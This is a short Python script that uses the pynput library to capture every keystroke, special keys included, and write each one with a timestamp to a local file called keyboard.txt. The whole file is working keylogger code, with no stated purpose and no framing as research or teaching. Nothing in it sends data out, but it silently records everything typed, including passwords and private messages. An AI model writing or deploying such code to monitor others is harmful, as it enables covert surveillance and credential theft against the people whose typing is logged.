from pynput import keyboard
import logging

logging.basicConfig(
    filename="keyboard.txt",
    level=logging.DEBUG,
    format="%(asctime)s:%(message)s"
)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"special Key pressed: {key}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()